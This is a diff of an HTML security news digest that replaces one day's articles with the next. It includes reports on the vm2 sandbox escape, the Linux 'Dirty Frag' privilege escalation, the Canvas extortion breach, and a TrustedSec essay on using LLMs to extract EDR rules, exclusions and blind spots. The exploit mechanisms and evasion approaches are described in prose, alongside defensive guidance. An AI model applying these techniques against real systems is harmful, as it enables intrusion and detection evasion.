@@ -59,172 +59,284 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-05-07</h1>
+        <h1>Security Briefing // 2026-05-08</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Critical vm2 sandbox bug lets attackers execute code on hosts</button></li><li><button onclick="show('art-1')">​​Microsoft named an overall leader in KuppingerCole Analyst’s 2026 Emerging AI Security Operations Center (SOC) report ​​</button></li><li><button onclick="show('art-2')">The Accidental C2: Exploring Dev Tunnels for Remote Access</button></li><li><button onclick="show('art-3')">The Defensive Stack is Exposed: LLMs, Reverse Engineering, and the End of Opaque Defense</button></li><li><button onclick="show('art-4')">CISA Adds Actively Exploited Linux Root Access Bug CVE-2026-31431 to KEV</button></li><li><button onclick="show('art-5')">CISA Adds Actively Exploited ConnectWise and Windows Flaws to KEV</button></li><li><button onclick="show('art-6')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-7')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-8')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li><li><button onclick="show('art-9')">Microsoft Patch Tuesday, March 2026 Edition</button></li></ul>
+            <ul><li><button onclick="show('art-0')">New Linux 'Dirty Frag' zero-day gives root on all major distros</button></li><li><button onclick="show('art-1')">Linux Kernel Dirty Frag LPE Exploit Enables Root Access Across Major Distributions</button></li><li><button onclick="show('art-2')">Canvas Breach Disrupts Schools & Colleges Nationwide</button></li><li><button onclick="show('art-3')">When prompts become shells: RCE vulnerabilities in AI agent frameworks</button></li><li><button onclick="show('art-4')">Shift Happens – Uncovering Two Built-in Command Injections in Windows Context Menus</button></li><li><button onclick="show('art-5')">GRC in an AI World - Staying in the Fast Lane Without Losing the Race!</button></li><li><button onclick="show('art-6')">CISA Adds Actively Exploited Linux Root Access Bug CVE-2026-31431 to KEV</button></li><li><button onclick="show('art-7')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-8')">Patch Tuesday, April 2026 Edition</button></li><li><button onclick="show('art-9')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Critical vm2 sandbox bug lets attackers execute code on hosts</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-vm2-sandbox-bug-lets-attackers-execute-code-on-hosts/" target="_blank">Original Link</a></p>
-            <div class="content-text">A critical vulnerability in the popular Node.js sandboxing library vm2 allows escaping the sandbox and executing arbitrary code on the host system.
-The security issue is tracked as CVE-2026-26956 and has been confirmed to impact vm2 version 3.10.4, although earlier releases may also be vulnerable. Proof-of-concept (PoC) exploit code has been published.
-In the security advisory, the maintainer says that the issue only impacts environments with Node.js 25 (confirmed on Node.js 25.6.1) that have enabled WebAssembly exception handling and JSTag support.
-GO TO PAGE
-vm2 is an open-source Node.js library used to run untrusted JavaScript code inside a restricted sandbox environment. It is commonly employed by online coding platforms, automation tools, and SaaS apps that execute user-supplied scripts.
-The library attempts to isolate sandboxed code from the host system and block access to sensitive Node.js APIs like process and the filesystem.
-vm2 is widely used, with more than 1.3 million weekly downloads [on the npm](https://www.npmjs.com/package/vm2) (Node Package Manager), the default command-line package manager for Node.js.
-CVE-2026-26956 stems from the library’s erroneous handling of exceptions crossing between the sandboxed environment and the host.
-The [advisory explains](https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66) that vm2 normally relies on JavaScript-level protections that safeguard against host-based errors and bridge Proxies that wrap cross-context objects, both running entirely within JavaScript.
-However, WebAssembly exception handling can intercept JavaScript errors at a lower level inside Google’s V8 engine, bypassing vm2’s JavaScript-based security defenses.
-By triggering a specially crafted TypeError using Symbol-to-string conversion, attackers can cause a host-side error object to leak back into the sandbox without being sanitized by vm2.
-Because the leaked object originates from the host environment, attackers can abuse its constructor chain to regain access to Node.js internals like the process object, ultimately allowing arbitrary command execution on the host system.
-The maintainer's security advisory also includes a PoC exploit that demonstrates remote code execution on the host machine.
-Users of vm2 are recommended to upgrade to [version 3.10.5](https://github.com/patriksimek/vm2/releases/tag/v3.10.5) or later ([latest is 3.11.2](https://github.com/patriksimek/vm2/releases/tag/v3.11.2)) as soon as possible to mitigate the risk of CVE-2026-26956 exploitation.
-At the beginning of the year, vm2 was impacted by another critical sandbox escape flaw that could lead to arbitrary code execution on the underlying host system, [tracked as CVE-2026-22709](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/).
-Earlier sandbox escape flaws impacting the same library include [CVE-2023-30547](https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/), [CVE-2023-29017](https://www.bleepingcomputer.com/news/security/exploit-available-for-critical-bug-in-vm2-javascript-sandbox-library/), and [CVE-2022-36067](https://www.bleepingcomputer.com/news/security/critical-vm2-flaw-lets-attackers-run-code-outside-the-sandbox/), reflecting the challenge of securely isolating untrusted code in JavaScript sandbox environments.
-[99% of What Mythos Found Is Still Unpatched.](https://hubs.li/Q04crVgD0)
-AI chained four zero-days into one exploit that bypassed both renderer and OS sandboxes. A wave of new exploits is coming.
-At the Autonomous Validation Summit (May 12 & 14), see how autonomous, context-rich validation finds what's exploitable, proves controls hold, and closes the remediation loop.
-[Claim Your Spot](https://hubs.li/Q04crVgD0)
-Post a Comment Community Rules
-You need to login in order to post a comment
-Not a member yet? Register Now</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">​​Microsoft named an overall leader in KuppingerCole Analyst’s 2026 Emerging AI Security Operations Center (SOC) report ​​</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/06/microsoft-named-an-overall-leader-in-kuppingercole-analysts-2026-emerging-ai-security-operations-center-soc-report/" target="_blank">Original Link</a></p>
-            <div class="content-text">Security operations are entering a new phase. As attack techniques grow faster and more complex, the effectiveness of a SOC depends less on collecting more data and more on how well platforms can turn context into action at scale.
-[KuppingerCole Analysts’ 2026 Emerging AI Security Operations Center (SOC) ](https://www.kuppingercole.com/reprints/b23fa477e7a19a6e24f60c7413c25a44)reflects this shift clearly: the future of security automation is not defined by static rules or isolated workflows, but by intelligence‑driven automation that supports analyst decision‑making across the full security lifecycle. This evolution mirrors what many security leaders already experience day to day, that the limiting factor is no longer alert volume, but human capacity.
-Microsoft is excited to be named an Overall Leader, and the Market Leader, in this report, as we see automation as a core component of the future of cybersecurity.
-From playbook‑driven SOAR to intelligence‑led automation
-Traditional security orchestration, automation, and response (SOAR) solutions were built to automate predictable, repeatable tasks: enrichment steps, ticket creation, notifications, and predefined containment actions. These capabilities remain valuable, but they were designed for an era when incidents followed more deterministic patterns.
-This is a critical change. In many SOCs today, analysts still spend significant time:
-- Stitching together context across alerts and data sources.
-- Manually triaging incidents that turn out to be benign.
-- Following repetitive investigation and response steps.
-The result is slower response times and analyst burnout—at exactly the moment attackers are moving faster and operating more quietly.
-Automation built into the analyst experience
-Microsoft has evolved the way these common challenges can be addressed, leveraging machine learning, large language models (LLMs), and agents, including releases such as:
-[Automatic attack disruption](https://learn.microsoft.com/en-us/defender-xdr/automatic-attack-disruption): An always-on capability that limits lateral attackers and reduces the overall impact of an attack, from associated costs to loss of productivity, leaving security operations teams in complete control of investigating, remediating, and bringing assets back online.[Phishing triage agent](https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/announcing-public-preview-phishing-triage-agent-in-microsoft-defender/4438301): An agent that runs sophisticated assessments—including semantic evaluation of email content, URL and file inspection, and intent detection—to determine whether a submission is a true phishing threat or a false alarm.[AI powered incident prioritization](https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/introducing-ai-powered-incident-prioritization-in-microsoft-defender/4483834): A machine learning prioritization model to surface the incidents that matter most, assigning each incident a priority score from 0–100 and explaining the key factors behind the ranking.[Playbook generator](https://techcommunity.microsoft.com/blog/microsoftsentinelblog/introducing-the-next-generation-of-soc-automation-sentinel-playbook-generator/4494438): An experience that allows users to create python-code playbooks using natural language for flexible workflow automation.
-These capabilities are just the beginning of how we are introducing agents and automation to help users move faster, freeing analysts to focus on higher‑value tasks like proactive hunting and threat analysis.
-The next evolution: The agentic SOC
-The [KuppingerCole report](https://www.kuppingercole.com/reprints/b23fa477e7a19a6e24f60c7413c25a44) reinforces a broader industry trend, that security platforms must do more than automate pre‑defined workflows. They must support adaptive, intelligence‑driven operations that can respond to novel and fast‑moving threats.
-This is where Microsoft is making its next set of investments: agentic security operations.
-With innovations such as the [Microsoft Sentinel](https://learn.microsoft.com/en-us/azure/sentinel/datalake/sentinel-mcp-get-started) MCP (Model Context Protocol) Server, shared security data and graph context, and deep integration with [Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot?msockid=047ad6124e486a7b1437c1584ff96b29), Sentinel is evolving into a platform where AI agents can:
-- Reason across identity, endpoint, cloud, and network signals.
-- Summarize incidents and investigations in natural language.
-- Assist with decision‑making by correlating weak signals over time.
-- Take action—with human oversight—when confidence thresholds are met.
-These agents are designed to work alongside analysts, augmenting expertise and dramatically accelerating time to response.
-Why this matters for security teams
-The direction highlighted by [KuppingerCole](https://www.kuppingercole.com/reprints/b23fa477e7a19a6e24f60c7413c25a44), and reflected in Microsoft’s roadmap, isn’t about chasing AI for its own sake. It’s about addressing real SOC pain points:
-- Scale: Human‑only operations don’t scale with modern attack surfaces.
-- Consistency: Automated and agent‑assisted workflows reduce variance and errors.
-- Speed: Faster reasoning and response directly reduce attacker dwell time.
-By combining automation, rich context, and intelligent agents, [Microsoft Sentinel](https://learn.microsoft.com/en-us/azure/sentinel/datalake/sentinel-mcp-get-started) helps SOC teams move from reactive alert handling to proactive, intelligence‑led defense without forcing teams to re‑architect their operations overnight.
-Looking ahead
-Security automation is no longer a bolt‑on capability. As [KuppingerCole’s](https://www.kuppingercole.com/reprints/b23fa477e7a19a6e24f60c7413c25a44) research makes clear, it is becoming a foundational element of modern security operations. The evolution of SOAR reflects the reality of a shift from static playbooks to adaptive, context‑aware assistance that scales human expertise.
-Microsoft is investing accordingly, advancing an AI‑first approach to security analytics that helps SOC teams operate with greater speed, confidence, and resilience as threats continue to evolve. Read the [Emerging AI Security Operations Center (SOC) report](https://www.kuppingercole.com/reprints/b23fa477e7a19a6e24f60c7413c25a44) to learn more.
-To learn more about Microsoft Security solutions, visit our [website.](https://www.microsoft.com/en-us/security/business) Bookmark the [Security blog](https://www.microsoft.com/security/blog/) to keep up with our expert coverage on security matters. Also, follow us on LinkedIn ([Microsoft Security](https://www.linkedin.com/showcase/microsoft-security/)) and X ([@MSFTSecurity](https://twitter.com/@MSFTSecurity)) for the latest news and updates on cybersecurity.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-2" class="article-body">
-            <h2 class="article-title">The Accidental C2: Exploring Dev Tunnels for Remote Access</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/05/06/dev-tunnels-the-accidental-c2/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>Dev Tunnels aren’t "just port forwarding". They consist of layers of embedded protocols with RPC messages being exchanged. Once you peal the layers, you quickly see how Dev Tunnels are a C2 framework with extra steps.</p>
-<p>The post <a href="https://specterops.io/blog/2026/05/06/dev-tunnels-the-accidental-c2/">The Accidental C2: Exploring Dev Tunnels for Remote Access</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+            <h2 class="article-title">New Linux 'Dirty Frag' zero-day gives root on all major distros</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/new-linux-dirty-frag-zero-day-with-poc-exploit-gives-root-privileges/" target="_blank">Original Link</a></p>
+            <div class="content-text">A new Linux zero-day vulnerability, named Dirty Frag, allows local attackers to gain root privileges on most major Linux distributions with a single command. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Linux Kernel Dirty Frag LPE Exploit Enables Root Access Across Major Distributions</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/linux-kernel-dirty-frag-lpe-exploit.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Details have emerged about a new, unpatched local privilege escalation (LPE) vulnerability impacting the Linux kernel.
+Dubbed [Dirty Frag](https://github.com/V4bel/dirtyfrag), it has been [described](https://www.openwall.com/lists/oss-security/2026/05/07/8) as a successor to [Copy Fail](https://thehackernews.com/2026/05/cisa-adds-actively-exploited-linux-root.html) (CVE-2026-31431, CVSS score: 7.8), a recently disclosed LPE flaw impacting the Linux kernel that has since come under active exploitation in the wild. The vulnerability was reported to Linux kernel maintainers on April 30, 2026.
+"Dirty Frag is a vulnerability (class) that achieves root privileges on most Linux distributions by chaining the xfrm-ESP Page-Cache Write vulnerability and the RxRPC Page-Cache Write vulnerability," security researcher Hyunwoo Kim (@v4bel) said in a write-up.
+"Dirty Frag is a case that extends the bug class to which [Dirty Pipe](https://thehackernews.com/2022/03/researchers-warn-of-linux-kernel-dirty.html) and [Copy Fail](https://thehackernews.com/2026/04/new-linux-copy-fail-vulnerability.html) belong. Because it is a deterministic logic bug that does not depend on a timing window, no race condition is required, the kernel does not panic when the exploit fails, and the success rate is very high."
+Successful exploitation of the flaw could allow an unprivileged local user to gain elevated root access on most Linux distributions, including Ubuntu 24.04.4, RHEL 10.1, openSUSE Tumbleweed, CentOS Stream 10, AlmaLinux 10, and Fedora 44.
+According to the researcher, the xfrm-ESP Page-Cache Write vulnerability was introduced in a [source code commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cac2661c53f3) made in January 2017, while the RxRPC Page-Cache Write vulnerability was [introduced](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2dc334f1a63a) in June 2023. Interestingly, the same January 17, 2017, commit was the root cause behind another buffer overflow ([CVE-2022-27666](https://etenal.me/archives/1825), CVSS score: 7.8) that affected various Linux distributions.
+xfrm-ESP Page-Cache Write, which is rooted in the IPSec (xfrm) subsystem, provides attackers with a 4-byte store primitive like Copy Fail and overwrites a small amount in the kernel's page cache.
+However, the exploit requires the unprivileged user to create a namespace, a step that's blocked by Ubuntu through [AppArmor](https://ubuntu.com/server/docs/how-to/security/apparmor/). In such an environment, xfrm-ESP Page-Cache Write cannot be triggered. That's where the second exploit, RxRPC Page-Cache Write, comes in.
+"RxRPC Page-Cache Write does not require the privilege to create a namespace, but the rxrpc.ko module itself is not included in most distributions," Kim explained. "For example, the default build of RHEL 10.1 does not ship rxrpc.ko. However, on Ubuntu, the rxrpc.ko module is loaded by default."
+"Chaining the two variants makes the blind spots cover each other. In an environment where user namespace creation is allowed, the ESP exploit runs first. Conversely, on Ubuntu, where user namespace creation is blocked but rxrpc.ko is built, the RxRPC exploit works."
+CloudLinx, in an [advisory](https://blog.cloudlinux.com/dirty-frag-mitigation-and-kernel-update) of its own, said the flaw resides in the "ESP-in-UDP MSG_SPLICE_PAGES no-COW fast path and is reachable via the XFRM user netlink interface."
+"The bug lives in the in-place decryption fast paths of esp4, esp6, and rxrpc: when a socket buffer carries paged fragments that are not privately owned by the kernel (e.g., pipe pages attached via splice(2)/sendfile(2)/MSG_SPLICE_PAGES), the receive path decrypts directly over those externally-backed pages, exposing or corrupting plaintext that an unprivileged process still holds a reference to," AlmaLinux [said](https://almalinux.org/blog/2026-05-07-dirty-frag/).
+Adding to the urgency is the release of a working proof-of-concept (PoC) that can be exploited to gain root in a single command. Until the patches are available, it's advised to blocklist esp4, esp6, and rxrpc modules so they cannot be loaded -
+sudo sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"
+It's worth mentioning here that Dirty Frag, despite sharing some overlaps with Copy Fail, can be exploited irrespective of whether the Linux kernel's algif_aead module is enabled or not.
+"Note that Dirty Frag can be triggered regardless of whether the algif_aead module is available," the researcher said. "In other words, even on systems where the publicly known Copy Fail mitigation (algif_aead blacklist) is applied, your Linux is still vulnerable to Dirty Frag."
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Canvas Breach Disrupts Schools & Colleges Nationwide</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/05/canvas-breach-disrupts-schools-colleges-nationwide/" target="_blank">Original Link</a></p>
+            <div class="content-text">An ongoing data extortion attack targeting the widely-used education technology platform Canvas disrupted classes and coursework at school districts and universities across the United States today, after a cybercrime group defaced the service’s login page with a ransom demand that threatened to leak data from 275 million students and faculty across nearly 9,000 educational institutions.
+Canvas parent firm Instructure [NYSE:INST] responded to today’s defacement attacks by disabling the platform, which is used by thousands of schools, universities and businesses to manage coursework and assignments, and to communicate with students.
+Instructure acknowledged a data breach earlier this week, after the cybercrime group ShinyHunters claimed responsibility and said they would leak data on tens of millions of students and faculty unless paid a ransom. The stated deadline for payment was initially set at May 6, but it was later pushed back to May 12.
+In [a statement](https://status.instructure.com/incidents/9wm4knj2r64z) on May 6, Instructure said the investigation so far shows the stolen information includes “certain identifying information of users at affected institutions, such as names, email addresses, and student ID numbers, as well as as messages among users.” The company said it found no evidence the breached data included more sensitive information, such as passwords, dates of birth, government identifiers or financial information.
+The May 6 update stated that Canvas was fully operational, and that Instructure was not seeing any ongoing unauthorized activity on their platform. “At this stage, we believe the incident has been contained,” Instructure wrote.
+However, by mid-day on Thursday, May 7, students and faculty at dozens of schools and universities were flooding social media sites with comments saying that a ransom demand from ShinyHunters had replaced the usual Canvas login page. Instructure responded by pulling Canvas offline and replacing the portal with the message, “Canvas is currently undergoing scheduled maintenance. Check back soon.”
+“We anticipate being up soon, and will provide updates as soon as possible,” reads the current message on Instructure’s [status page](https://status.instructure.com/incidents/m88d7ymwpzpy).
+While the data stolen by ShinyHunters may or may not contain particularly sensitive information (ShinyHunters claims it includes several billion private messages among students and teachers, as well as names, phone numbers and email addresses), this attack could hardly have come at a worse time for Instructure: Many of the affected schools and universities are in the middle of final exams, and a prolonged outage could be highly damaging for the company.
+The extortion message that greeted countless Canvas users today advised the affected schools to negotiate their own ransom payments to prevent the publication of their data — regardless of whether Instructure decides to pay.
+“ShinyHunters has breached Instructure (again),” the extortion message read. “Instead of contacting us to resolve it they ignored us and did some ‘security patches.'”
+A source close to the investigation who was not authorized to speak to the press told KrebsOnSecurity that a number of universities have already approached the cybercrime group about paying. The same source also pointed out that the ShinyHunters data leak blog no longer lists Instructure among its current extortion victims, and that the samples of data stolen from Canvas customers were removed as well. Data extortion groups like ShinyHunters will typically only remove victims from their leak sites after receiving an extortion payment or after a victim agrees to negotiate.
+Dipan Mann, founder and CEO of the security firm Cloudskope, slammed Instructure for referring to today’s outage as a “scheduled maintenance” event on its status page. Mann said Shiny Hunters first demonstrated they’d breached Instructure on May 1, prompting Instructure’s Chief Information Security Officer Steve Proud to declare the following day that the incident had been contained. But Mann said today’s attack is at least the third time in the past eight months that Instructure has been breached by ShinyHunters.
+In a blog post today, Mann noted that in September 2025, ShinyHunters released thousands of internal University of Pennsylvania files — donor records, internal memos, and other confidential materials — through what the Daily Pennsylvanian and other outlets later determined was, in part, a Canvas/Instructure-mediated access path.
+“Penn was the named victim,” Mann [wrote](https://www.cloudskope.com/insights/post/instructure-canvas-ransomware-attack-hits-universities-2026). “Instructure was the mechanism. The incident was treated as a Penn-specific story by most of the national press and quietly handled by Instructure as a customer-specific matter. That framing was wrong then. It is dramatically more wrong in light of the May 2026 events, which now look like the planned escalation of an attack pattern that ShinyHunters had been working against Instructure’s environment for at least eight months prior. The September 2025 Penn breach was the proof of concept. The May 1, 2026 incident was the production run. The May 7, 2026 recompromise was ShinyHunters demonstrating publicly that the May 2 ‘containment’ did not happen.”
+In February, a ShinyHunters spokesperson told The Daily Pennsylvanian that Penn [failed to pay a $1 million ransom demand](https://www.thedp.com/article/2026/02/penn-hack-donor-data-ransom-one-million-shinyhunters-gse-emai). On March 5, ShinyHunters published 461 megabytes worth of data stolen from Penn, including thousands of files such as donor records and internal memos.
+ShinyHunters is a prolific and fluid cybercriminal group that specializes in data theft and extortion. They typically gain access to companies through voice phishing and social engineering attacks that often involve impersonating IT personnel or other trusted members of a targeted organization.
+Last month, ShinyHunters relieved the home security giant ADT of personal information on 5.5 million customers. The extortion group [told BleepingComputer](https://www.bleepingcomputer.com/news/security/home-security-giant-adt-data-breach-affects-55-million-people/) they breached the company by compromising an employee’s Okta single sign-on account in a voice phishing attack that enabled access to ADT’s Salesforce instance. BleepingComputer says ShinyHunters recently has taken credit for a number of extortion attacks against high-profile organizations, including Medtronic, Rockstar Games, McGraw Hill, 7-Eleven and the cruise line operator Carnival.
+The attack on Canvas customers is just one of several major cybercrime campaigns being launched by ShinyHunters at the moment, said Charles Carmakal, chief technology officer at the Google-owned Mandiant Consulting. Carmakal declined to comment specifically on the Canvas breach, but said “there are multiple concurrent and discreet ShinyHunters intrusion and extortion campaigns happening right now.”
+Cloudskope’s Mann said what happens next depends largely on whether Instructure’s customers — the universities, K-12 districts, and education ministries paying for Canvas — choose to apply pressure or absorb the breach quietly.
+“The history of education-vendor incidents suggests the path of least resistance is the second one,” he concluded.
+These hackers have no honor. They have brought shame to both their families and their ancestors. Their parents should be embarrassed by them.
+Regarding “Canvas parent firm Instructure [NYSE:INST]”, Instructure was taken private in 2024. It is no longer a public company.
+“Canvas is currently undergoing scheduled ransomware negotiation. Check back soon”
+Fixed it.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
         <div id="art-3" class="article-body">
-            <h2 class="article-title">The Defensive Stack is Exposed: LLMs, Reverse Engineering, and the End of Opaque Defense</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/the-defensive-stack-is-exposed" target="_blank">Original Link</a></p>
-            <div class="content-text">The Defensive Stack is Exposed: LLMs, Reverse Engineering, and the End of Opaque Defense
-Table of contents
-Everyone is talking about LLMs finding zero days. That is not the only story. The story is what happens when you point these models at the defensive tools organizations depend on for first line defense. AI is changing the economics of understanding systems, including the systems built to stop attackers.
-The Wrong Conversation
-While security Twitter argues about LLM-generated exploits, autonomous bug hunting, and whether a model can replace a red team, LLMs are already useful for something more immediately practical: systematically understanding and reverse engineering the defensive products themselves.
-Across five commercial endpoint products we evaluated internally, workflows that previously took skilled reverse engineers weeks of focused effort now took days. The model handled the mapping, summarization, and cross-version comparison that used to dominate the timeline, and a human spent their attention on validation and judgment calls. The same approaches transferred across AV products, EDR platforms, appliances, and other defensive tooling with only minor steering. Outputs still require validation, but the timeline compression is real.
-The acquisition problem everyone thought was the hard part was never the hard part. Defensive products end up on university download sites, customer trials, VirusTotal submissions, GitHub repositories, misconfigured S3 buckets, and random places. Minimum-seat requirements and "we do not sell to researchers" policies slow down independent researchers and small labs, but they do not stop anyone. In some cases they make the ecosystem worse by limiting legitimate scrutiny while doing little to reduce adversary access. Once the product, configuration, update package, or endpoint artifact is available, the real question is not whether an attacker can get it. The real question is how long it takes them to understand it. That is the part LLMs are changing.
-Universal Approaches, Universal Problems
-Here is what testing showed: the same core analysis workflows work across vendors with minor steering. That is not a coincidence. It says something fundamental about the state of defensive tooling.
-These products share architectural patterns, rely on similar frameworks, and make comparable design decisions driven by the same business pressures. They face the same trade-off between comprehensive detection and false positives. They need some form of local policy, rules, signatures, scoring logic, scripted engine, or ML model to make decisions on the host. Tuning choices made under those constraints create predictable behavioral patterns.
-That extends well beyond traditional signatures. A modern defensive product is usually a mix of YARA-style rules, behavioral logic, allowlists, prefilters, cloud lookups, scripted engines, and local ML classifiers. Some vendors use decision trees or neural models. Others ship hundreds of behavioral rules as readable Lua source after one decryption pass. Most do all of the above. There is lots of decision logic on or near the host, and decision logic can be studied.
-The prompt is not magic. The workflow is what matters: give the model enough context to map the system, identify the decision points, separate confirmed behavior from hypotheses, and help the operator focus their manual validation. What used to require deep product expertise and long manual analysis can now be accelerated by someone who knows what questions to ask.
-The Security Through Obscurity Collapse
-A large amount of defensive tooling was built around the assumption that its internal logic would remain opaque to attackers. Detection algorithms, rule structures, behavioral models, policy formats, scoring thresholds, and tuning decisions were protected mostly through access restrictions, product complexity, and lack of attacker time.
-That assumption is breaking.
-When defensive products operate on endpoints, their rules, configurations, policies, logs, update packages, and model artifacts become accessible somewhere. Maybe not cleanly. Maybe not completely. Maybe not in a format the vendor intended anyone to read. Enough of it exists for an attacker to study, however.
-This is especially true for local detection logic. If a product needs to make a decision on the host, some part of that decision path has to exist on or near the host. That could be a rule pack, a feature extractor, a scoring threshold, a scripted behavioral engine, a prefilter, an exclusion list, or a local model that decides whether something is clean, suspicious, or malicious. The same is true for the policy that selects which of those engines run, with what thresholds, and against which paths and processes, and that policy is often readable on the endpoint itself, sometimes literally world-readable in the registry.
-Complexity used to be part of the protection. It is a smaller barrier now, because LLMs are good at helping humans move through complex systems. They do not need to perfectly reverse engineer everything. They only need to reduce the time required to find useful seams.
-This is not saying defensive tools are worthless. It is saying the old model of "attackers will not understand how this works" is no longer a safe assumption. If a product only works because its internal logic is hard to inspect, that is not durable security. That is temporary friction.
-What This Actually Means
-Organizations are making security purchasing decisions based on a threat model that assumed attackers would not be able to study how their defensive products actually work. Obfuscation, proprietary formats, encrypted configurations, and the sheer expertise required for product-specific reverse engineering were treated as durable barriers. Procurement evaluates products against static test cases, compliance checkboxes, and MITRE mappings on the assumption that whatever the attacker brings will not include a working understanding of the product's internal decision logic. That assumption is what is failing. The barriers still exist, but LLMs collapse the time and skill required to get past them, which means the threat model the purchase was made under is not the threat model the product is now operating in.
-The reality is different.
-Rule Extraction: YARA rules, behavioral signatures, detection conditions, and related logic can be extracted, reconstructed, or inferred from on-disk artifacts and observed behavior.
-Model Analysis: Local ML models, feature extraction logic, scoring thresholds, and verdict boundaries can often be studied enough to understand what the product values and what it ignores.
-Scripted Engine Analysis: Embedded interpreters expose how behavioral events are matched, scored, suppressed, or escalated, and the rules they execute are usually shipped to the host.
-Policy and Exclusion Mining: A surprising amount of effective policy is readable on the endpoint. Trusted paths, process allowlists, signer rules, command line exclusions, file-type masks, and per-rule silencing flags let an attacker pick the least-monitored path before doing anything noisy.
-Gap Analysis: Blind spots become easier to identify when rules, models, prefilters, exclusions, trust paths, and management states can be analyzed together rather than one at a time.
-Version Comparison: Updates expose what the vendor changed, what they fixed quietly, and what suddenly became important enough to modify.
-Vulnerability Discovery: The same analysis that maps detection logic also surfaces product-specific vulnerabilities. Parsing routines, IPC interfaces, kernel callbacks, update mechanisms, local services running at SYSTEM, and tamper-protection logic all become inspectable. LLM-assisted review accelerates the hunt for memory corruption, logic flaws, privilege escalation paths, unsafe deserialization, and signed-driver abuse in the very products meant to stop them. More lines of code means more problems, and defensive products ship a lot of code.
-This is not theoretical. It is the operational reality of reducing the cost of analysis. Skilled operators already did this kind of work. LLMs make it faster, more repeatable, and more accessible to people who do not have years of product-specific reverse engineering experience.
-This also changes how defenders should think about detection confidence. A quiet endpoint product does not automatically mean nothing happened. It may mean the activity fell below a threshold, hit a prefilter, matched an exclusion, hit a cached clean verdict keyed by path rather than content, or occurred while the sensor was in maintenance, recovery, or a degraded cloud-disconnected state. Several products we looked at had legitimate operational states that relax tamper protection or drop telemetry, and the conditions to reach them are visible to anyone who reads the agent.
-Where This Goes Next
-The defensive stack is becoming part of the attack surface. The same capabilities being applied to endpoint products will move outward to SIEM correlation rules and alert pipelines, cloud policy and identity relationships, WAF and runtime application controls, and any other defensive surface that ships its decision logic close to the asset it protects.
-The pattern repeats anywhere defensive tooling relies on complexity, access restrictions, or hidden logic for protection. If the control makes decisions, those decisions can eventually be studied. If the decision logic can be studied, LLMs compress the time required to understand it. One fair counterpoint vendors can use the same tools to find and fix the seams faster, and pointing a model at their own product gives them every advantage, including source code, build artifacts, telemetry, and test infrastructure. The asymmetry is not technical. It is procedural. Attackers ship findings the moment they are useful. Vendors ship findings through triage queues, regression testing, customer pilots, staged rollouts, and support contracts. The defender's analysis is not slower because the AI is slower, it is slower because the path from "we found something" to "every customer is protected" is measured in weeks or quarters, while the path from "we found something" to "we used it on an engagement" is measured in days. Until that gap closes, the attacker side of this curve will keep moving faster than the defender side, regardless of who has better tooling.
-What Defenders Should Actually Do
-Most defenders will never reverse engineer their EDR, and they should not have to. The point is simpler: assume the attacker has, and assume they know which techniques your product misses, ignores, or silently routes around. That changes which controls you should be leaning on.
-The lesson is not "fix your EDR." It is "stop carrying the weight on a single layer the attacker can study." Put real budget and attention into the layers that do not depend on opaque endpoint logic.
-1. Harden the host so the techniques attackers know are gaps cannot land cleanly.
-These controls work whether the EDR has a rule for the technique. They raise the floor under everything else.
-- Application control. WDAC, AppLocker, or a third-party equivalent in enforcement mode (not audit), with a signer-and-path policy that blocks unsigned binaries from user-writable directories. This kills a large fraction of "EDR did not have a rule for it" payloads outright.
